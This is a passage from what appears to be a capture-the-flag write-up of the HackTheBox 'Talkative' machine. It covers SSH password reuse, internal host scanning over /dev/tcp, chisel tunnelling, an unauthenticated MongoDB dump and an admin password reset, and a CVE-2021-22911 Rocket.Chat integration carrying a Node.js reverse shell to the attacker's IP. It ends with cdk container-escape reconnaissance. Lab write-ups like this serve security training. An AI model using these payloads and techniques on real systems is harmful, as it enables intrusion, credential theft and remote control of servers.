class="number">.1</span></span><br><span class="line">port <span class="number">22</span> <span class="keyword">is</span> <span class="built_in">open</span></span><br><span class="line">Scanning <span class="number">172.18</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line">test.sh: connect: Connection timed out</span><br><span class="line">test.sh: line <span class="number">1</span>: /dev/tcp/<span class="number">172.18</span><span class="number">.0</span><span class="number">.2</span>/<span class="number">22</span>: Connection timed out</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>Bingo, let’s try to see if any users from the Bolt <code>xdata.json</code> file re-use his password. We got lucky,  <code>saul</code> do:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ pwncat-cs -lp <span class="number">8585</span></span><br><span class="line">[<span class="number">16</span>:05:02] Welcome to pwncat 🐈!        </span><br><span class="line">[<span class="number">16</span>:05:03] received connection <span class="keyword">from</span> <span class="number">10.129</span><span class="number">.122</span><span class="number">.121</span>:<span class="number">39802</span>       </span><br><span class="line">(remote) www-data@46c004bb2269:/var/www/talkative.htb/bolt/public$ ssh saul@<span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;172.18.0.1 (172.18.0.1)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:kUPIZ6IPcxq7Mei4nUzQI3JakxPUtkTlEejtabx4wnY.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">saul@172.18.0.1&#x27;</span>s password:</span><br><span class="line">Welcome to Ubuntu <span class="number">20.04</span><span class="number">.4</span> LTS (GNU/Linux <span class="number">5.4</span><span class="number">.0</span>-<span class="number">81</span>-generic x86_64)</span><br><span class="line"></span><br><span class="line">saul@talkative:~$ cat user.txt</span><br><span class="line">f7xxxxxxxxxxxxxxxx087</span><br></pre></td></tr></table></figure><h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>Usual recon doesn’t yield any interesting files or mis-configuration that could easily trigger privilege escalation. However while monitoring <code>pspy</code> I noticed a script referring <code>mongo</code> running as <code>root</code>. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">saul@talkative:~$ ./tmp/pspy64</span><br><span class="line">[...]</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">24</span> <span class="number">16</span>:<span class="number">21</span>:01 CMD: UID=<span class="number">0</span>    PID=<span class="number">50639</span>  | python3 /root/.backup/update_mongo.py</span><br></pre></td></tr></table></figure><p>It’s surprising because MongoDB usually run on port <code>27017</code> which doesn’t appears in <code>netstat</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">saul@talkative:/tmp$ netstat -tulpn | grep LISTEN</span><br><span class="line">(Not <span class="built_in">all</span> processes could be identified, non-owned process info</span><br><span class="line"> will <span class="keyword">not</span> be shown, you would have to be root to see it <span class="built_in">all</span>.)</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6007</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6008</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3000</span>          <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6009</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6010</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6011</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6012</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6013</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6014</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6015</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6000</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8080</span>            <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6001</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8081</span>            <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6002</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8082</span>            <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6003</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6004</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6005</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.53</span>:<span class="number">53</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6006</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">22</span>              <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> :::<span class="number">8080</span>                 :::*                    LISTEN      -</span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> :::<span class="number">8081</span>                 :::*                    LISTEN      -</span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> :::<span class="number">8082</span>                 :::*                    LISTEN      -</span><br></pre></td></tr></table></figure><p>This probably means that the MongoDB instance is running on another docker container. Let’s dig a bit on this path to see if we can retrieve sensitive informations from the database.</p><h3 id="Pivot-saul-→-Rocket-chat"><a href="#Pivot-saul-→-Rocket-chat" class="headerlink" title="Pivot saul → Rocket.chat"></a>Pivot saul → Rocket.chat</h3><p>First let’s re-use our script to find in which host <code>mongo</code> is running:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(seq <span class="number">1</span> <span class="number">20</span>)</span><br><span class="line">do </span><br><span class="line">    host=<span class="number">172.18</span><span class="number">.0</span>.$i</span><br><span class="line">    echo <span class="string">&quot;Scanning $host&quot;</span>;(echo &gt;/dev/tcp/$host/<span class="number">27017</span>) &amp;&gt;/dev/null &amp;&amp; echo <span class="string">&quot;$host is up (port 27017 open)&quot;</span></span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>We find the MongoDB instance running on host <code>172.17.0.2:27017</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">saul@talkative:/tmp$ bash host_discovery.sh</span><br><span class="line">Scanning <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Scanning <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line"><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span> <span class="keyword">is</span> up (port <span class="number">27017</span> <span class="built_in">open</span>)</span><br><span class="line">Scanning <span class="number">172.17</span><span class="number">.0</span><span class="number">.3</span></span><br><span class="line">Scanning <span class="number">172.17</span><span class="number">.0</span><span class="number">.4</span></span><br><span class="line">Scanning <span class="number">172.17</span><span class="number">.0</span><span class="number">.5</span></span><br></pre></td></tr></table></figure><p>Since we don’t have SSH access, Let’s use <a href="https://github.com/jpillora/chisel">chisel</a> to forward the <code>mongobd</code> port to our <a href="http://localhost/">localhost</a> in order to see what is in the database:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">saul@talkative:/tmp$ wget <span class="number">10.10</span><span class="number">.14</span><span class="number">.19</span>:<span class="number">8000</span>/chisel &amp;&amp; chmod +x chisel</span><br><span class="line">Saving to: ‘chisel’</span><br></pre></td></tr></table></figure><p>Let’s open the listener on our machine:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ chisel server -p <span class="number">8585</span> --reverse</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">24</span> <span class="number">16</span>:<span class="number">44</span>:<span class="number">42</span> server: Reverse tunnelling enabled</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">24</span> <span class="number">16</span>:<span class="number">44</span>:<span class="number">42</span> server: Fingerprint 5lXTHz9HmTtx2xUn5Q7wRLCZFERrnSLX/XWGVoYNjwM=</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">24</span> <span class="number">16</span>:<span class="number">44</span>:<span class="number">42</span> server: Listening on http://<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8585</span></span><br></pre></td></tr></table></figure><p>And the client pointing to port <code>27017</code> on talkative host:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">saul@talkative:/tmp$ ./chisel client <span class="number">10.10</span><span class="number">.14</span><span class="number">.19</span>:<span class="number">8585</span> R:<span class="number">27017</span>:<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">27017</span></span><br><span class="line"><span class="number">2022</span>/04/<span class="number">25</span> <span class="number">13</span>:04:<span class="number">00</span> client: Connecting to ws://<span class="number">10.10</span><span class="number">.14</span><span class="number">.19</span>:<span class="number">8585</span></span><br><span class="line"><span class="number">2022</span>/04/<span class="number">25</span> <span class="number">13</span>:04:01 client: Connected (Latency <span class="number">33.130311</span>ms)</span><br></pre></td></tr></table></figure><p>Once connected we can using <code>mongosh</code> (MongoDB Shell) to read the database content. Good news is, the database doesn’t require authentication: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ mongosh <span class="string">&quot;mongodb://127.0.0.1:27017&quot;</span></span><br><span class="line">Current Mongosh Log ID:62669d8d54003c56213b04cc</span><br><span class="line">Connecting to:mongodb://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">27017</span>/?directConnection=true&amp;serverSelectionTimeoutMS=<span class="number">2000</span>&amp;appName=mongosh+<span class="number">1.3</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">rs0 [direct: primary] test&gt; show databases</span><br><span class="line">admin    <span class="number">106</span> kB</span><br><span class="line">config   <span class="number">127</span> kB</span><br><span class="line">local   <span class="number">11.8</span> MB</span><br><span class="line">meteor  <span class="number">4.89</span> MB</span><br><span class="line">rs0 [direct: primary] config&gt; use meteor</span><br><span class="line">switched to db meteor</span><br><span class="line">rs0 [direct: primary] meteor&gt; show tables</span><br><span class="line">[...]</span><br><span class="line">users</span><br><span class="line">usersSessions</span><br><span class="line">rs0 [direct: primary] meteor&gt; db.users.find()</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _<span class="built_in">id</span>: <span class="string">&#x27;rocket.cat&#x27;</span>,</span><br><span class="line">    createdAt: ISODate(<span class="string">&quot;2021-08-10T19:44:00.224Z&quot;</span>),</span><br><span class="line">    avatarOrigin: <span class="string">&#x27;local&#x27;</span>,</span><br><span class="line">    name: <span class="string">&#x27;Rocket.Cat&#x27;</span>,</span><br><span class="line">    username: <span class="string">&#x27;rocket.cat&#x27;</span>,</span><br><span class="line">    status: <span class="string">&#x27;online&#x27;</span>,</span><br><span class="line">    statusDefault: <span class="string">&#x27;online&#x27;</span>,</span><br><span class="line">    utcOffset: <span class="number">0</span>,</span><br><span class="line">    active: true,</span><br><span class="line">    <span class="built_in">type</span>: <span class="string">&#x27;bot&#x27;</span>,</span><br><span class="line">    _updatedAt: ISODate(<span class="string">&quot;2021-08-10T19:44:00.615Z&quot;</span>),</span><br><span class="line">    roles: [ <span class="string">&#x27;bot&#x27;</span> ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    _<span class="built_in">id</span>: <span class="string">&#x27;ZLMid6a4h5YEosPQi&#x27;</span>,</span><br><span class="line">    createdAt: ISODate(<span class="string">&quot;2021-08-10T19:49:48.673Z&quot;</span>),</span><br><span class="line">    services: &#123;</span><br><span class="line">      password: &#123;</span><br><span class="line">        bcrypt: <span class="string">&#x27;$2b$10$jzSWpBq.eJ/yn/Pdq6ilB.UO/kXHB1O2A.b2yooGebUbh69NIUu5y&#x27;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      email: &#123;</span><br><span class="line">        verificationTokens: [</span><br><span class="line">          &#123;</span><br><span class="line">            token: <span class="string">&#x27;dgATW2cAcF3adLfJA86ppQXrn1vt6omBarI8VrGMI6w&#x27;</span>,</span><br><span class="line">            address: <span class="string">&#x27;saul@talkative.htb&#x27;</span>,</span><br><span class="line">            when: ISODate(<span class="string">&quot;2021-08-10T19:49:48.738Z&quot;</span>)</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      resume: &#123;</span><br><span class="line">        loginTokens: [</span><br><span class="line">          &#123;</span><br><span class="line">            when: ISODate(<span class="string">&quot;2022-03-15T17:06:53.808Z&quot;</span>),</span><br><span class="line">            hashedToken: <span class="string">&#x27;VMehhXEh1Z89e3nwMIq+2f5JIFid/7vo6Xb6bXh2Alc=&#x27;</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    emails: [ &#123; address: <span class="string">&#x27;saul@talkative.htb&#x27;</span>, verified: false &#125; ],</span><br><span class="line">    <span class="built_in">type</span>: <span class="string">&#x27;user&#x27;</span>,</span><br><span class="line">    status: <span class="string">&#x27;offline&#x27;</span>,</span><br><span class="line">    active: true,</span><br><span class="line">    _updatedAt: ISODate(<span class="string">&quot;2022-04-04T17:12:30.788Z&quot;</span>),</span><br><span class="line">    roles: [ <span class="string">&#x27;admin&#x27;</span> ],</span><br><span class="line">    name: <span class="string">&#x27;Saul Goodman&#x27;</span>,</span><br><span class="line">    lastLogin: ISODate(<span class="string">&quot;2022-03-15T17:06:56.543Z&quot;</span>),</span><br><span class="line">    statusConnection: <span class="string">&#x27;offline&#x27;</span>,</span><br><span class="line">    username: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    utcOffset: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>We have access to the accounts information of the <a href="http://rocket.chat/">Rocket.chat</a> application running on port 3000. </p><p>We are not going to try cracking the <code>bcrypt</code> hash, it would be no use since we have write access to the database. The <a href="http://rocket.chat/">rocket.chat</a> <a href="https://docs.rocket.chat/guides/administration/misc.-admin-guides/restoring-an-admin">documentation</a> explains how to reset an admin user password to <code>12345</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rs0 [direct: primary] meteor&gt; db.getCollection(<span class="string">&#x27;users&#x27;</span>).updateOne(&#123;username:<span class="string">&quot;admin&quot;</span>&#125;, &#123; $<span class="built_in">set</span>: &#123;<span class="string">&quot;services&quot;</span> : &#123; <span class="string">&quot;password&quot;</span> : &#123;<span class="string">&quot;bcrypt&quot;</span> : <span class="string">&quot;$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG&quot;</span> &#125; &#125; &#125; &#125;)</span><br><span class="line">&#123;</span><br><span class="line">  acknowledged: true,</span><br><span class="line">  insertedId: null,</span><br><span class="line">  matchedCount: <span class="number">1</span>,</span><br><span class="line">  modifiedCount: <span class="number">1</span>,</span><br><span class="line">  upsertedCount: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">rs0 [direct: primary] meteor&gt;</span><br></pre></td></tr></table></figure><p>We can now connect to the <a href="http://rocket.chat/">Rocket.Chat</a> application as admin we can quickly gather more information (like version number):</p><p><img src="https://user-images.githubusercontent.com/9076747/165098988-b93a12a4-07a2-4c12-ba90-3ef8253db870.png" alt="https://user-images.githubusercontent.com/9076747/165098988-b93a12a4-07a2-4c12-ba90-3ef8253db870.png"></p><p>Searching for exploit on this version returns CVE-2021-22911: “<a href="https://github.com/CsEnox/CVE-2021-22911">Pre-Auth Blind NoSQL Injection leading to Remote Code Execution in Rocket Chat 3.12.1</a>”.</p><blockquote><p><strong>RCE ( Autenticated - Admin )</strong><br>Rocket.Chat has a feature called Integrations that allows creating incoming and outgoing web hooks. These web hooks can have scripts associated with them that are executed when the web hook is triggered.<br>We create a integration with a remote execution script.</p></blockquote><p>Let’s give it a try. </p><p>It’s a bit of struggle to open a reverse shell, <a href="http://rocket.chat/">rocket.chat</a> is very probably also running in a docker container with no <code>nc</code>, <code>bash</code> nor <code>python</code> available.<br>After searching a bit we can find this <a href="https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/">Node.js reverse shell</a> that should give better luck since it doesn’t require any external tools. Let’s build our payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const require = console.log.constructor(<span class="string">&#x27;return process.mainModule.require&#x27;</span>)();</span><br><span class="line">var net = require(<span class="string">&quot;net&quot;</span>), cp = require(<span class="string">&quot;child_process&quot;</span>), sh = cp.spawn(<span class="string">&quot;/bin/sh&quot;</span>, []);</span><br><span class="line">var client = new net.Socket();</span><br><span class="line">client.connect(<span class="number">8544</span>, <span class="string">&quot;10.10.14.19&quot;</span>, function()&#123;</span><br><span class="line">  client.pipe(sh.stdin);</span><br><span class="line">  sh.stdout.pipe(client);</span><br><span class="line">  sh.stderr.pipe(client);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Then we create the Integration:</p><p><img src="https://user-images.githubusercontent.com/9076747/165103605-a827aa1a-9d98-403b-8e80-40eee285fb92.png" alt="https://user-images.githubusercontent.com/9076747/165103605-a827aa1a-9d98-403b-8e80-40eee285fb92.png"></p><p>Once saved we can trigger the webhook to receive the connection on our reverse shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://talkative.htb:<span class="number">3000</span>/hooks/3FBhk4BCPEsMTxWeh/Sej9ohSu6mfE9pdQvbR97hHAfSWm7pxyWYZu8qvde3BRkazK</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ pwncat-cs -lp <span class="number">8544</span>                                                                           __main__.py:<span class="number">164</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">56</span>:<span class="number">00</span>] received connection <span class="keyword">from</span> <span class="number">10.129</span><span class="number">.227</span><span class="number">.113</span>:<span class="number">41104</span>                                                          bind.py:<span class="number">84</span></span><br><span class="line">(remote) root@c150397ccd63:/app/bundle/programs/server<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>Once again <code>pwncat-cs</code> comes useful to upload our enumeration script since <code>wget</code> nor <code>curl</code> is available on the box:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(local) pwncat$ upload ./tools/lp.sh /tmp/lp.sh</span><br><span class="line">[<span class="number">13</span>:<span class="number">59</span>:<span class="number">38</span>] uploaded <span class="number">776.17</span>KiB <span class="keyword">in</span> <span class="number">0.66</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Once again, our enumeration do not returns any useful information, but that’s expected when running in a docker container. Knowing that we exploited all the services running on this box it might be time to try a container escape vulnerability.<br>I decided to give a try to <code>cdk</code> which is an open-sourced container penetration toolkit.<br>Once run we get notified that the <code>CAP_DAC_READ_SEARCH</code> capability is set on the container:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(remote) root@c150397ccd63:/root<span class="comment"># ./cdk evaluate</span></span><br><span class="line"></span><br><span class="line">[Information Gathering - System Info]</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">25</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">40</span> current <span class="built_in">dir</span>: /root</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">25</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">40</span> current user: root uid: <span class="number">0</span> gid: <span class="number">0</span> home: /root</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">25</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">40</span> hostname: c150397ccd63</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">25</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">40</span> debian debian <span class="number">10.10</span> kernel: <span class="number">5.4</span><span class="number">.0</span>-<span class="number">81</span>-generic</span><br><span class="line"></span><br><span class="line">[Information Gathering - Services]</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">25</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">40</span> sensitive env found:</span><br><span class="line">DEPLOY_METHOD=docker-official</span><br><span class="line"></span><br><span class="line">[Information Gathering - Commands <span class="keyword">and</span> Capabilities]</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">25</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">40</span> available commands:</span><br><span class="line">find,node,npm,apt,dpkg,mount,fdisk,base64,perl</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">25</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">40</span> Capabilities <span class="built_in">hex</span> of Caps(CapInh|CapPrm|CapEff|CapBnd|CapAmb):</span><br><span class="line">CapInh:<span class="number">0000000000000000</span></span><br><span class="line">CapPrm:00000000a80425fd</span><br><span class="line">CapEff:00000000a80425fd</span><br><span class="line">CapBnd:00000000a80425fd</span><br><span class="line">CapAmb:<span class="number">0000000000000000</span></span><br><span class="line">Cap decode: <span class="number">0x00000000a80425fd</span> = CAP_CHOWN,CAP_DAC_READ_SEARCH,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP</span><br><span class="line">Add capability <span class="built_in">list</span>: CAP_DAC_READ_SEARCH</span><br><span class="line">[*] Maybe you can exploit the Capabilities below:</span><br><span class="line">[!] CAP_DAC_READ_SEARCH enabled. You can read files <span class="keyword">from</span> host. Use <span class="string">&#x27;cdk run cap-dac-read-search&#x27;</span> ... <span class="keyword">for</span> exploitation.</span><br></pre></td></tr></table></figure><p>According the manual, the 